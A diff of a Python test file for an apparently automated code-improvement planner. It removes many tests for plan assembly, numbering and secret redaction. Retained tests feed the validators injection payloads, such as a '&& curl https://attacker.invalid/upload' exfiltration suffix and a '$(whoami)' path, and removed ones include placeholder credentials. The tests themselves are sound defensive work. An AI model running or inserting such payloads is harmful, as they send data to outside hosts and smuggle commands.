@@ -27,12 +27,9 @@ from daydream.improve.assemble import (
 )
 from daydream.improve.command_contract import (
     APPLICABILITY_SCHEMA,
-    canonicalize_directory_scope,
     literal_command_error,
     path_is_confined,
-    valid_directory_scope_lexical,
     valid_repository_file_path,
-    validate_applicability,
     validate_host_commands,
     validate_recon_commands,
 )
@@ -167,16 +164,6 @@ def _recon_commands() -> list[dict[str, Any]]:
         },
     ]
 
-def test_recon_validation_retains_valid_siblings_when_one_is_invalid(repo: Path) -> None:
-    commands = []
-    for index in range(3):
-        command = deepcopy(_recon_commands()[0])
-        command["id"] = f"command-{index:02d}"
-        commands.append(command)
-    commands[1]["applicability"]["scope"]["kind"] = "unsupported"
-    accepted, errors = validate_recon_commands({"commands": commands}, repo=repo,)
-    assert [item["id"] for item in accepted] == ["command-00", "command-02"]
-    assert errors == ["RECON_APPLICABILITY_INVALID@/commands/1/applicability/scope/kind"]
 
 def test_recon_working_directory_accepts_confined_absolute_and_rejects_outside(repo: Path, tmp_path: Path) -> None:
     abs_under = (repo / "apps" / "catalog").as_posix()
@@ -197,31 +184,6 @@ def test_recon_working_directory_accepts_confined_absolute_and_rejects_outside(r
     assert accepted == []
     assert errors == ["RECON_WORKING_DIRECTORY_INVALID@/commands/0/working_directory"]
 
-@pytest.mark.parametrize("model_excerpt",
-    [pytest.param("uv run pytest", id="model-text-is-not-canonical"),
-        pytest.param(None, id="model-text-is-optional"), pytest.param(42, id="model-text-has-non-string-shape"),
-    ],
-)
-def test_recon_evidence_uses_locators_and_persists_host_excerpt(tmp_path: Path, model_excerpt: object,) -> None:
-    repo = tmp_path / "repo"
-    repo.mkdir()
-    (repo / "Makefile").write_text(
-        "test:\n\tuv run pytest\n\n",
-        encoding="utf-8",
-    )
-    evidence: dict[str, Any] = {
-        "kind": "literal-command", "source_path": "Makefile", "line_anchor": {"start_line": 2, "end_line": 3},
-    }
-    if model_excerpt is not None:
-        evidence["verbatim_excerpt"] = model_excerpt
-    command = _contract_recon_command(command_id="test-suite", command="uv run pytest", evidence=evidence,)
-    raw_command = deepcopy(command)
-
-    accepted, errors = validate_recon_commands({"commands": [command]}, repo=repo,)
-
-    assert errors == []
-    assert command == raw_command
-    assert accepted[0]["evidence"]["verbatim_excerpt"] == "\tuv run pytest\n"
 
 def test_invalid_recon_locator_rejects_only_its_candidate(tmp_path: Path) -> None:
     repo = tmp_path / "repo"
@@ -263,18 +225,6 @@ def _contract_recon_command(*, command_id: str, command: str, evidence: dict[str
         }, "applicability": _contract_applicability(*paths), "evidence": evidence,
     }
 
-def test_directory_scope_canonicalization_drops_the_trailing_slash(tmp_path: Path,) -> None:
-    repo = tmp_path / "repo"
-    (repo / "frontend").mkdir(parents=True)
-    applicability = _contract_applicability("frontend/")
-    normalized, rejection = validate_applicability(applicability, repo=repo)
-    assert rejection is None
-    assert normalized is not None
-    assert applicability["scope"]["paths"] == ["frontend/"]
-    assert normalized["scope"]["paths"] == ["frontend"]
-    assert canonicalize_directory_scope("frontend/") == "frontend"
-    assert canonicalize_directory_scope("./frontend") == "frontend"
-    assert canonicalize_directory_scope("./frontend/") == "frontend"
 
 def test_command_contract_schema_discloses_scope_cross_field_invariants() -> None:
     invalid_variants = [{"scope": {"kind": "whole-repository", "paths": ["frontend"]}, "preconditions": [],
@@ -287,49 +237,6 @@ def test_command_contract_schema_discloses_scope_cross_field_invariants() -> Non
     validator = Draft202012Validator(APPLICABILITY_SCHEMA)
     assert all(list(validator.iter_errors(item)) for item in invalid_variants)
 
-def test_host_enumerates_make_targets_and_package_scripts(tmp_path: Path,) -> None:
-    repo = tmp_path / "repo"
-    (repo / "admin-dashboard").mkdir(parents=True)
-    make_lines = ["SHELL := /bin/bash", ".PHONY: build test",
-        "build: ## Build every module",
-        "test: ## Run all tests",
-        "test-frontend: ## Run frontend tests",
-        "lint typecheck: ## Run all static checks",
-        "\tuv run ruff check .",
-    ]
-    (repo / "Makefile").write_text(
-        "\n".join(make_lines) + "\n",
-        encoding="utf-8",
-    )
-    # No packageManager field: the corepack opt-in most repositories omit.
-    (repo / "admin-dashboard/package.json").write_text(json.dumps(
-            {"name": "admin-dashboard", "scripts": {"test": "vitest run", "build:app": "vite build"},}, indent=2,
-        )
-        + "\n",
-        encoding="utf-8",
-    )
-    (repo / "admin-dashboard/pnpm-lock.yaml").write_text(
-        "lockfileVersion: '9.0'\n",
-        encoding="utf-8",
-    )
-
-    commands = enumerate_repository_commands(repo, directories=(".", "admin-dashboard"),)
-
-    assert [item["command"] for item in commands] == [
-        "make build", "make test", "make test-frontend", "make lint", "make typecheck", "pnpm test", "pnpm build:app",
-    ]
-    assert [item["id"] for item in commands] == [
-        "make-build", "make-test", "make-test-frontend", "make-lint", "make-typecheck", "pnpm-test", "pnpm-build-app",
-    ]
-    by_command = {item["command"]: item for item in commands}
-    assert by_command["make test"]["applicability"]["scope"] == {"kind": "whole-repository"}
-    assert by_command["pnpm test"]["working_directory"] == "admin-dashboard"
-    assert by_command["pnpm test"]["applicability"]["scope"] == {"kind": "in-scope-paths", "paths": ["admin-dashboard"],
-    }
-    assert (by_command["pnpm test"]["evidence"]["source_path"] == "admin-dashboard/package.json")
-    assert (by_command["pnpm test"]["evidence"]["verbatim_excerpt"].strip() == '"test": "vitest run",')
-    assert by_command["make test"]["evidence"]["line_anchor"] == {"start_line": 4, "end_line": 4,}
-    assert enumerate_repository_commands(repo, directories=(".", "admin-dashboard")) == commands
 
 def test_host_enumeration_excludes_mutating_make_targets_and_package_scripts(tmp_path: Path,) -> None:
     repo = tmp_path / "repo"
@@ -587,21 +494,6 @@ def _write_single_plan(repo: Path, assembled: dict[str, Any], planned_at: str,) 
     """Write one assembled plan for ``repo`` through the production API."""
     return _write_plans(repo / "daydream_plans", [{"finding": _finding(), **assembled}], planned_at=planned_at,)
 
-def test_assembled_plan_renders_complete_deterministic_handoff(repo: Path, head_sha: str) -> None:
-    result = _write_single_plan(repo, _assembled(repo), head_sha)
-    assert len(result["written"]) == 1
-    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
-    assert "### Step 1: Batch item loading in list_catalog" in text
-    assert "**Command**: `uv run pytest tests/test_catalog.py -q`" in text
-    assert "**Why this gate**: Runs the focused catalog regression suite." in text
-    assert "test_list_catalog_batches_item_loading" in text
-    assert "apps/catalog/api.py:1-2" in text
-    assert "return [load_item(item_id) for item_id in item_ids]" in text
-    assert "**Branch**: improve/batch-catalog-queries" in text
-    assert "**Covered finding fingerprints**: `fp-fix-n-plus-one`" in text
-    assert "Set this plan's Status cell" not in text
-    assert "daydream_plans/README.md" not in text
-    assert "TODO" in (repo / "daydream_plans/README.md").read_text()
 
 MALFORMED_FIRST_RUN_COMMANDS = (
     "make test -> uv run pytest -n auto", "pre-push hook (...): uv lock --check && ...", "CI checks: uv run pytest -q",
@@ -616,20 +508,7 @@ def test_first_run_prose_and_annotation_commands_are_blocked(repo: Path, literal
     assert commands == []
     assert errors == ["RECON_MALFORMED_COMMAND@/commands/0/command"]
 
-def test_null_args_ref_expands_to_recon_record_byte_for_byte(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["steps"][0]["verification"] = _ref(note="The repository suite proves the catalog behavior end to end.")
-    assembled = _assembled(repo, plan)
-    gate = assembled["steps"][0]["verification"]
-    base = _recon_commands()[0]
-    for key in ("purpose", "command", "working_directory", "expected_success"):
-        assert gate[key] == base[key]
 
-def test_appended_args_expand_to_recon_prefix_plus_suffix(repo: Path) -> None:
-    assembled = _assembled(repo)
-    gate = assembled["steps"][0]["verification"]
-    assert gate["command"] == "uv run pytest tests/test_catalog.py -q"
-    assert gate["working_directory"] == "."
 
 @pytest.mark.parametrize("suffix",
     ["&& curl https://attacker.invalid/upload", "|| curl https://attacker.invalid/upload",
@@ -738,14 +617,6 @@ def test_react_router_dollar_segment_is_rejected(repo: Path, location: str) -> N
     assert not path_is_confined(repo, path)
     assert not _PATH_REJECTION_CODES.isdisjoint({issue.code for issue in issues})
 
-@pytest.mark.parametrize("path", ["services/api/", "services/api"])
-def test_out_of_scope_directory_prefix_accepts_trailing_slash(repo: Path, path: str) -> None:
-    plan = _authored_plan()
-    plan["scope"]["out_of_scope_paths"][0]["path"] = path
-    _, issues = assemble_plan(plan, repo=repo, recon_commands=_recon_commands(),)
-    assert valid_directory_scope_lexical(path)
-    assert path_is_confined(repo, path, directory_scope=True)
-    assert _PATH_REJECTION_CODES.isdisjoint({issue.code for issue in issues})
 
 @pytest.mark.parametrize("path", ["../outside.py", "src/$(whoami).py", "linked-outside/secret.py"],)
 def test_repository_file_path_rejects_escape_and_substitution(repo: Path, path: str, tmp_path: Path,) -> None:
@@ -776,74 +647,10 @@ def test_scope_paths_reject_tracked_and_untracked_symlinked_parents(
 
     assert "PATH_OUTSIDE_REPOSITORY" in {issue.code for issue in issues}
 
-def test_valid_new_path_with_nonexistent_parent_remains_allowed(repo: Path, head_sha: str) -> None:
-    plan = _authored_new_file_plan()
-    result = _write_single_plan(repo, _assembled(repo, plan), head_sha)
-    assert len(result["written"]) == 1
-    assert "tests/test_catalog_batching.py" in (repo / "daydream_plans/001-add-catalog-batching-regression.md"
-    ).read_text()
 
-def test_unselected_recon_commands_are_not_injected_into_plan(repo: Path, head_sha: str) -> None:
-    commands = _recon_commands()
-    commands.append({**commands[0], "id": "unrelated-global-lint", "purpose": "Run the unrelated repository lint suite",
-            "command": "uv run ruff check .",
-        }
-    )
-    assembled = _assembled(repo, commands=commands)
-    result = _write_single_plan(repo, assembled, head_sha)
 
-    assert len(result["written"]) == 1
-    # The same ref is used by the step, the named case, and a done criterion:
-    # the derived table dedups them to one row and injects nothing else.
-    assert [command["command"] for command in assembled["commands_you_will_need"]
-    ] == ["uv run pytest tests/test_catalog.py -q"]
-    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
-    assert "uv run ruff check ." not in text
-    assert "unrelated repository lint suite" not in text
 
-@pytest.mark.parametrize("model_excerpt",
-    [pytest.param("WRONG stray model text", id="stray-model-text-is-ignored"),
-        pytest.param(None, id="anchors-only-shape"), pytest.param(42, id="stray-non-string-shape-is-ignored"),
-    ],
-)
-def test_plan_current_state_uses_locator_and_persists_host_excerpt(repo: Path, head_sha: str, model_excerpt: object,
-) -> None:
-    plan = _authored_plan()
-    if model_excerpt is not None:
-        plan["scope"]["existing_paths"][0]["verbatim_excerpt"] = model_excerpt
-    raw_plan = deepcopy(plan)
-    result = _write_single_plan(repo, _assembled(repo, plan), head_sha)
-    assert len(result["written"]) == 1
-    assert plan == raw_plan
-    text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
-    assert (
-        "def list_catalog():\n"
-        "    return [load_item(item_id) for item_id in item_ids]"
-    ) in text
-    assert "WRONG stray model text" not in text
 
-def test_stray_markdown_key_is_stripped_and_plan_writes(repo: Path, head_sha: str) -> None:
-    plan = _authored_plan()
-    plan["markdown"] = "## Steps\n\nTOKEN=super-secret-value"
-    result = _write_single_plan(repo, _assembled(repo, plan), head_sha)
-    assert len(result["written"]) == 1
-    for artifact in (repo / "daydream_plans").iterdir():
-        assert "super-secret-value" not in artifact.read_text(encoding="utf-8")
-
-def test_mixed_batch_writes_valid_sibling_and_blocks_invalid_sibling(repo: Path, head_sha: str,) -> None:
-    invalid = _authored_plan(title="Invalid catalog plan")
-    invalid["test_plan"]["cases"] = []
-    issues = _issues(repo, invalid)
-    result = _write_plans(repo / "daydream_plans",
-        [{"finding": _finding(), **_assembled(repo)}, _authoring_failure_selection(issues, fingerprint="fp-invalid"),],
-        planned_at=head_sha,
-    )
-    assert len(result["written"]) == 1
-    assert len(result["failed"]) == 1
-    assert [path.name for path in (repo / "daydream_plans").glob("0*.md")] == ["001-batch-catalog-queries.md"]
-    index = (repo / "daydream_plans/README.md").read_text()
-    assert "| TODO |" in index
-    assert "BLOCKED (PLAN_VALIDATION_FAILED: AUTHOR_SCHEMA_INVALID" in index
 
 def _plan_selection(repo: Path, title: str) -> dict[str, Any]:
     """One landed plan-writer result with its own fingerprint and slug."""
@@ -851,87 +658,8 @@ def _plan_selection(repo: Path, title: str) -> dict[str, Any]:
 
 _CONCURRENT_TITLES = ["Batch catalog queries", "Catalog observability", "Catalog cache invalidation",]
 
-@pytest.mark.parametrize(("count", "completion_order"),
-    [pytest.param(1, [0], id="n1"), pytest.param(3, [0, 1, 2], id="n3-completion-matches-selection"),
-        pytest.param(3, [2, 1, 0], id="n3-completion-reversed"), pytest.param(3, [1, 2, 0], id="n3-completion-rotated"),
-        pytest.param(3, [2, 0, 1], id="n3-first-selected-lands-second"),
-    ],
-)
-def test_plan_numbers_follow_selection_order_not_completion_order(
-    repo: Path, head_sha: str, count: int, completion_order: list[int],
-) -> None:
-    plans_dir = repo / "daydream_plans"
-    titles = _CONCURRENT_TITLES[:count]
-    selections = [_plan_selection(repo, title) for title in titles]
-    result = _write_plans(plans_dir, selections, planned_at=head_sha, completion_order=completion_order,)
-    expected = [f"{rank + 1:03d}-{plan_slug(title)}.md" for rank, title in enumerate(titles)]
-    assert [entry["path"] for entry in result["written"]] == expected
-    assert [entry["number"] for entry in result["written"]] == list(range(1, count + 1))
-    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")) == sorted(expected)
-    index = (plans_dir / "README.md").read_text(encoding="utf-8")
-    for rank, title in enumerate(titles):
-        assert (f"| [{rank + 1:03d}]({expected[rank]}) " f"<!-- fingerprint:fp-{plan_slug(title)} -->") in index
-    assert index.count("| TODO |") == count
 
-def test_each_plan_is_on_disk_before_its_slower_siblings_commit(repo: Path, head_sha: str) -> None:
-    plans_dir = repo / "daydream_plans"
-    selections = [_plan_selection(repo, title) for title in _CONCURRENT_TITLES]
-    session = PlanWriteSession(plans_dir, planned_at=head_sha)
-    reservations = session.reserve([selection["finding"] for selection in selections])
 
-    observed: list[tuple[list[str], int]] = []
-    for index in (2, 0, 1):
-        outcome = session.commit(reservations[index], selections[index])
-        assert outcome.status == "written"
-        index_text = (plans_dir / "README.md").read_text(encoding="utf-8")
-        observed.append(
-            (sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")), index_text.count("| TODO |"),)
-        )
-
-    assert observed == [(["003-catalog-cache-invalidation.md"], 1),
-        (["001-batch-catalog-queries.md", "003-catalog-cache-invalidation.md",], 2,),
-        (["001-batch-catalog-queries.md", "002-catalog-observability.md", "003-catalog-cache-invalidation.md",], 3,),
-    ]
-    session.finish()
-
-def test_blocked_sibling_holds_its_number_without_shifting_later_plans(repo: Path, head_sha: str,) -> None:
-    """A blocked attempt reserves its number for retry while later siblings retain their own numbers."""
-    plans_dir = repo / "daydream_plans"
-    invalid = _authored_plan(title="Catalog observability")
-    invalid["test_plan"]["cases"] = []
-    issues = _issues(repo, invalid)
-    blocked = _authoring_failure_selection(issues, fingerprint="fp-catalog-observability",)
-    result = _write_plans(plans_dir,
-        [_plan_selection(repo, "Batch catalog queries"), blocked, _plan_selection(repo, "Catalog cache invalidation"),],
-        planned_at=head_sha, completion_order=[2, 0, 1],
-    )
-
-    assert [entry["path"] for entry in result["written"]] == [
-        "001-batch-catalog-queries.md", "003-catalog-cache-invalidation.md",
-    ]
-    assert len(result["failed"]) == 1
-    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")
-    ) == ["001-batch-catalog-queries.md", "003-catalog-cache-invalidation.md",]
-    index = (plans_dir / "README.md").read_text(encoding="utf-8")
-    assert ("| 002 <!-- fingerprint:fp-catalog-observability --> | "
-        "Fix N+1 catalog queries | P1 | M | "
-        "BLOCKED (PLAN_VALIDATION_FAILED: AUTHOR_SCHEMA_INVALID) |"
-    ) in index
-
-    retried = _write_plans(
-        plans_dir, [_plan_selection(repo, "Catalog observability"), _plan_selection(repo, "Catalog retry budgets"),],
-        planned_at=head_sha, completion_order=[1, 0],
-    )
-
-    assert [entry["number"] for entry in retried["written"]] == [2, 4]
-    assert sorted(path.name for path in plans_dir.glob("[0-9][0-9][0-9]-*.md")) == [
-        "001-batch-catalog-queries.md", "002-catalog-observability.md", "003-catalog-cache-invalidation.md",
-        "004-catalog-retry-budgets.md",
-    ]
-    final_index = (plans_dir / "README.md").read_text(encoding="utf-8")
-    assert final_index.count("fingerprint:fp-catalog-observability") == 1
-    assert "PLAN_VALIDATION_FAILED" not in final_index
-    assert final_index.count("| TODO |") == 4
 
 def test_already_planned_finding_reserves_no_number_for_its_siblings(repo: Path, head_sha: str,) -> None:
     plans_dir = repo / "daydream_plans"
@@ -1164,13 +892,6 @@ def test_concurrent_runs_prune_does_not_destroy_live_reanchored_plan(repo: Path,
     assert "REANCHORED" in (repo / "daydream_plans" / "README.md").read_text(encoding="utf-8")
     assert git_ops.worktree_lock_mtime(worktree_a) is None  # released
 
-def test_prune_named_reanchor_worktree_removes_valid_worktree(repo: Path) -> None:
-    target = _operational_root(repo) / "run-abcd-reanchor"
-    git(repo, "worktree", "add", "--detach", str(target), "HEAD")
-    outcome = prune_named_reanchor_worktree(repo, "run-abcd-reanchor")
-    assert outcome.verdict == PRUNE_REMOVED
-    assert not target.exists()
-    assert "run-abcd-reanchor" not in git(repo, "worktree", "list")
 
 def test_prune_named_reanchor_worktree_reports_plan_count(repo: Path) -> None:
     target = _operational_root(repo) / "run-abcd-reanchor"
@@ -1337,15 +1058,6 @@ def test_reanchor_scans_reject_linked_legacy_namespace_before_mutation(
     assert git(repo, "worktree", "list", "--porcelain") == before
     assert not (owner.operational_state_root / "operational" / external.name).exists()
 
-def test_planned_at_still_matching_head_writes_in_place(repo: Path, head_sha: str,) -> None:
-    result = _write_single_plan(repo, _assembled(repo), head_sha)
-    assert len(result["written"]) == 1
-    assert result["written"][0]["path"] == "001-batch-catalog-queries.md"
-    plan_file = repo / "daydream_plans/001-batch-catalog-queries.md"
-    assert plan_file.is_file()
-    text = plan_file.read_text(encoding="utf-8")
-    assert f"**Planned at**: commit `{head_sha[:7]}`" in text
-    assert not list((_operational_root(repo)).glob("*-reanchor"))
 
 @pytest.mark.parametrize(
     "status", ["TODO", "IN PROGRESS", "DONE", "BLOCKED (tests failed after three executor attempts)",],
@@ -1590,78 +1302,11 @@ def test_record_rejections_appends_and_loads_by_fingerprint(tmp_path: Path,) -> 
     envelope = json.loads((plans_dir / "rejected.json").read_text())
     assert envelope == {"schema_version": 1, "rejected": [first, second],}
 
-def test_overlong_authored_prose_is_clamped_during_normalization(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["scope"]["existing_paths"][0]["role"] = "S" * 306
-    plan["why_this_matters"]["problem"] = "P" * 810
-    assembled = _assembled(repo, plan)
-    role = assembled["scope"]["existing_paths"][0]["role"]
-    assert len(role) == 300
-    assert role == "S" * 299 + "…"
-    problem = assembled["why_this_matters"]["problem"]
-    assert len(problem) == 800
-    assert problem == "P" * 799 + "…"
 
-def test_unclamped_overlong_title_is_an_issue_with_max_length_detail(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["title"] = "T" * 170
-    issues = _issues(repo, plan)
-    assert [(issue.code, issue.pointer, issue.detail) for issue in issues
-    ] == [("AUTHOR_SCHEMA_INVALID", "/title", "maxLength=160;actual=170")]
-    assert issues[0].hint is not None
-    assert "at most 160 characters (it has 170)" in issues[0].hint
 
-def test_min_length_violation_issue_carries_detail_segment(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["why_this_matters"]["problem"] = ""
-    issues = _issues(repo, plan)
-    assert [(issue.code, issue.pointer, issue.detail) for issue in issues
-    ] == [("AUTHOR_SCHEMA_INVALID", "/why_this_matters/problem", "minLength=30;actual=0",)]
 
-@pytest.mark.parametrize("prose",
-    ["Callers must send X-Internal-Service-Secret: <internalSecret> on every request.",
-        "Callers must send X-Internal-Service-Secret: ${INTERNAL_SECRET} on every request.",
-        "The deploy script reads secret: $SECRET from the environment at startup.",
-        "The fixture configures secret: test-secret for the local integration suite.",
-        "The tokenizer: sentencepiece choice stays as the repository has it.",
-        "The passwordless: true flag in the fixture config stays untouched.",
-    ],
-)
-def test_secret_placeholder_prose_survives_normalization_unchanged(repo: Path, prose: str) -> None:
-    plan = _authored_plan()
-    plan["why_this_matters"]["problem"] = prose
-    assembled = _assembled(repo, plan)
-    assert assembled["why_this_matters"]["problem"] == prose
 
-def test_secret_literal_value_is_redacted_and_never_reaches_artifacts(repo: Path, head_sha: str,) -> None:
-    plan = _authored_plan()
-    plan["why_this_matters"]["problem"] = ("The bootstrap script hardcodes secret: hunter2realvalue in cleartext.")
-    assembled = _assembled(repo, plan)
-    result = _write_single_plan(repo, assembled, head_sha)
-    assert assembled["why_this_matters"]["problem"] == (
-        "The bootstrap script hardcodes secret: <redacted> in cleartext."
-    )
-    assert "hunter2realvalue" not in json.dumps(assembled)
-    assert len(result["written"]) == 1
-    plan_text = (repo / "daydream_plans/001-batch-catalog-queries.md").read_text()
-    assert "<redacted>" in plan_text
-    for artifact in (repo / "daydream_plans").iterdir():
-        assert "hunter2realvalue" not in artifact.read_text(encoding="utf-8")
 
-def test_underscored_secret_key_name_is_redacted_in_quoted_source(repo: Path, head_sha: str,) -> None:
-    """Improve must catch underscored secret-key names missed by word-boundary and trajectory rules."""
-    (repo / "apps/catalog/api.py").write_text(
-        'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"\n'
-        "    return [load_item(item_id) for item_id in item_ids]\n",
-        encoding="utf-8",
-    )
-    assembled = _assembled(repo)
-    result = _write_single_plan(repo, assembled, head_sha)
-    excerpt = next(item for item in assembled["current_state_excerpts"] if item["path"] == "apps/catalog/api.py")
-    assert excerpt["verbatim_excerpt"].startswith("aws_secret_access_key = <redacted>")
-    assert len(result["written"]) == 1
-    for artifact in (repo / "daydream_plans").iterdir():
-        assert "wJalrXUtnFEMI" not in artifact.read_text(encoding="utf-8")
 
 def test_assemble_reports_every_issue_at_once_with_pointers_and_hints(repo: Path) -> None:
     plan = _authored_plan()
@@ -1678,38 +1323,7 @@ def test_assemble_reports_every_issue_at_once_with_pointers_and_hints(repo: Path
     assert unknown.pointer == "/steps/0/verification/recon_command_id"
     assert unknown.hint == "valid recon command ids: test-suite, git-diff"
 
-def test_assemble_numbers_steps_and_done_criteria_and_injects_mandatory_kinds(repo: Path) -> None:
-    plan = _authored_plan()
-    plan["steps"].append({"title": "Harden the catalog regression coverage",
-            "changes": [_change('tests/test_catalog.py', 'test_list_catalog_returns_items', 'modify',
-                    'Extend the existing regression to cover an empty catalog.',
-                    'The regression suite also proves empty-catalog behavior.'
-                )
-            ], "verification": None,
-        }
-    )
 
-    assembled = _assembled(repo, plan)
-
-    assert [(step["id"], step["order"]) for step in assembled["steps"]] == [("step-1", 1), ("step-2", 2),]
-    criteria = assembled["done_criteria"]
-    assert [criterion["id"] for criterion in criteria] == ["done-1", "done-2", "done-3",]
-    assert [criterion["kind"] for criterion in criteria] == ["behavior", "test-gate", "scope-integrity",]
-    assert "test_list_catalog_batches_item_loading" in criteria[1]["description"]
-    assert "apps/catalog/api.py" in criteria[2]["description"]
-
-def test_assemble_templates_three_boilerplate_stop_conditions_plus_false_assumption(repo: Path,) -> None:
-    plan = _authored_plan()
-    assembled = _assembled(repo, plan)
-    conditions = assembled["stop_conditions"]
-    assert [condition["kind"] for condition in conditions] == [
-        "drift", "repeated-verification-failure", "out-of-scope-change", "false-assumption",
-    ]
-    assert all(condition["required_action"] == "STOP_AND_REPORT" for condition in conditions)
-    false_assumption = conditions[3]
-    assert false_assumption["condition"] == ("The load_item interface cannot accept multiple catalog identifiers.")
-    assert false_assumption["related_step_ids"] == ["step-1"]
-    assert conditions[0]["related_paths"] == ["apps/catalog/api.py", "tests/test_catalog.py",]
 
 def test_assemble_relocates_an_already_existing_new_path_into_existing_scope(repo: Path, head_sha: str,) -> None:
     plan = _authored_new_file_plan()
@@ -1756,13 +1370,6 @@ def test_assemble_still_rejects_a_new_path_occupied_by_a_directory(repo: Path) -
     issues = _issues(repo, plan)
     assert [render_issue(issue) for issue in issues] == ["NEW_PATH_ALREADY_EXISTS@/scope/new_paths/0/path"]
 
-def test_an_edited_file_the_plan_never_quotes_is_blocked(repo: Path) -> None:
-    """Every edited file needs quoted text for the executor's drift comparison."""
-    plan = _authored_plan()
-    plan["context_excerpts"] = [entry for entry in plan["context_excerpts"] if entry["path"] != "apps/catalog/api.py"]
-    issues = _issues(repo, plan)
-    assert [render_issue(issue) for issue in issues] == ["EXISTING_PATH_NOT_QUOTED@/scope/existing_paths/0/path"]
-    assert "context_excerpts" in (issues[0].hint or "")
 
 def test_the_drift_condition_names_only_paths_the_plan_quotes(repo: Path, head_sha: str) -> None:
     """Cover authored, relocated new-path, and undeclared step-path anchors in the drift condition."""
@@ -1785,27 +1392,6 @@ def test_the_drift_condition_names_only_paths_the_plan_quotes(repo: Path, head_s
         assert f"- `{path}:1-" in rendered
     assert "# Catalog service" in rendered
 
-def test_undeclared_step_path_is_declared_existing_with_a_usable_excerpt(repo: Path, head_sha: str,) -> None:
-    plan = _authored_plan()
-    _declare_makefile_out_of_scope(plan)
-    _add_readme_change(plan)
-
-    assembled = _assembled(repo, plan)
-    scope = assembled["scope"]
-    assert [entry["path"] for entry in scope["existing_paths"]] == [
-        "apps/catalog/api.py", "tests/test_catalog.py", "README.md",
-    ]
-    assert scope["new_paths"] == []
-    # The model had declared README.md out of scope; the step wins.
-    assert [entry["path"] for entry in scope["out_of_scope_paths"]] == ["Makefile"]
-    quoted = [excerpt for excerpt in assembled["current_state_excerpts"] if excerpt["path"] == "README.md"]
-    assert quoted[0]["line_anchor"] == {"start_line": 1, "end_line": 1}
-    assert quoted[0]["verbatim_excerpt"] == "# Catalog service"
-    rendered = _render_assembled_plan(assembled, head_sha)
-    assert ("git add apps/catalog/api.py tests/test_catalog.py README.md" in rendered)
-    assert "- `README.md` (existing) —" in rendered
-    assert "- `README.md` (create) —" not in rendered
-    assert "`README.md:1-1`" in rendered
 
 def test_step_editing_the_sole_out_of_scope_path_still_blocks(repo: Path) -> None:
     """In-scope wins deduplication, leaving an empty out-of-scope list for schema repair."""
@@ -1816,18 +1402,6 @@ def test_step_editing_the_sole_out_of_scope_path_still_blocks(repo: Path) -> Non
         "AUTHOR_SCHEMA_INVALID@/scope/out_of_scope_paths#minItems=1;actual=0"
     ]
 
-def test_undeclared_test_case_path_is_declared_new_when_absent_from_disk(repo: Path, head_sha: str,) -> None:
-    plan = _authored_plan()
-    unlisted = "tests/test_catalog_batching.py"
-    plan["test_plan"]["cases"][0]["test_file"] = unlisted
-    assembled = _assembled(repo, plan)
-    scope = assembled["scope"]
-    assert [entry["path"] for entry in scope["new_paths"]] == [unlisted]
-    assert [entry["path"] for entry in scope["existing_paths"]] == ["apps/catalog/api.py", "tests/test_catalog.py",]
-    rendered = _render_assembled_plan(assembled, head_sha)
-    assert (f"git add apps/catalog/api.py tests/test_catalog.py {unlisted}" in rendered)
-    assert f"- `{unlisted}` (create) —" in rendered
-    assert f"::{plan['test_plan']['cases'][0]['test_symbol']}" in rendered
 
 def _scoped_recon_command(command_id: str, *, command: str, paths: list[str],) -> dict[str, Any]:
     scoped = deepcopy(_recon_commands()[0])
@@ -1842,26 +1416,6 @@ def _retarget_refs(plan: dict[str, Any], recon_command_id: str) -> None:
     plan["test_plan"]["cases"][0]["verification"] = _ref(recon_command_id)
     plan["done_criteria"][0]["verification"] = _ref(recon_command_id)
 
-def test_step_gate_scope_mismatch_falls_back_to_the_repository_wide_command(repo: Path, head_sha: str,) -> None:
-    plan = _authored_plan()
-    # The gate covers the step's implementation path but not its test path.
-    _retarget_refs(plan, "catalog-only")
-    commands = [*_recon_commands(),
-        _scoped_recon_command("catalog-only", command="uv run pytest apps/catalog", paths=["apps/catalog"],),
-    ]
-
-    assembled = _assembled(repo, plan, commands=commands)
-    rendered = _render_assembled_plan(assembled, head_sha)
-    step_section = rendered.partition("### Step 1:")[2].partition("## Test plan")[0]
-    assert "**Command**: `uv run pytest`" in step_section
-    assert "uv run pytest apps/catalog" not in step_section
-    assert ("**Why this gate**: Retargeted by the host: the command this plan "
-        "named does not cover this verification's targets, so this "
-        "repository-wide command runs instead." in step_section
-    )
-    # The named test case targets tests/test_catalog.py, so its mismatched gate
-    # is retargeted independently too.
-    assert "`uv run pytest apps/catalog`" not in rendered
 
 def test_command_scope_mismatch_without_a_repo_wide_command_renders_a_caveat(repo: Path, head_sha: str,) -> None:
     plan = _authored_plan()
@@ -2156,22 +1710,6 @@ def test_undeclared_malformed_step_path_is_blocked_and_never_declared_in_scope(r
     assert "MALFORMED_PATH@/steps/0/changes/0/path" in {render_issue(issue) for issue in issues}
     assert not [issue for issue in issues if issue.pointer.startswith("/scope/")]
 
-def test_assemble_synthesizes_behavior_done_criterion_from_intended_outcome(repo: Path, head_sha: str,) -> None:
-    plan = _authored_plan()
-    plan["done_criteria"] = [_criterion("static-invariant", "No call to load_item remains inside list_catalog."),]
-
-    assembled = _assembled(repo, plan)
-    criteria = assembled["done_criteria"]
-    assert [criterion["kind"] for criterion in criteria] == [
-        "behavior", "static-invariant", "test-gate", "scope-integrity",
-    ]
-    assert criteria[0]["description"] == ("The plan's intended outcome holds: list_catalog batches item "
-        "loading while preserving results."
-    )
-    rendered = _render_assembled_plan(assembled, head_sha)
-    assert ("- [ ] **done-1 (behavior)**: The plan's intended outcome holds: "
-        "list_catalog batches item loading while preserving results."
-    ) in rendered
 
 def test_assemble_drops_out_of_range_stop_step_numbers_instead_of_blocking(repo: Path, head_sha: str,) -> None:
     plan = _authored_plan()
@@ -2202,24 +1740,6 @@ def test_assemble_clamps_excerpt_end_line_but_rejects_start_beyond_eof(repo: Pat
         if issue.code == "EXCERPT_ANCHOR_INVALID"
